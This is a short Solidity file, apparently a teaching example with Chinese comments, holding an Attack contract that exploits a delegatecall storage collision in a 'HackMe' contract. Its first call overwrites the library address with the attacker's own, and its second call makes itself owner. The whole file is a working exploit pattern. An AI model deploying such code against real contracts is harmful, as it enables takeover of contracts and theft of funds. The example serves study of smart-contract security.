// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "./HackMe.sol";

contract Attack {
    address public lib;
    address public owner;
    uint public someNumber;

    HackMe public hackMe;

    /* 注意此处构造器与HackMe构造器的差异。 */
    /* 此处的用法才是正确且安全的 */
    constructor(HackMe _hackMe) {
        hackMe = HackMe(_hackMe);
    }

    function attack() public {
        /* 覆盖了HackMe合约中第一个参数 ，也就是lib的值 */
        hackMe.doSomething(uint(uint160(address(this))));

        /* 这里调用的是下面的doSomething方法 */
        hackMe.doSomething(1);
    }

    /* 此方法的目的是改变owner的值 */
    function doSomething(uint _num) public {
        owner = msg.sender;
    }
}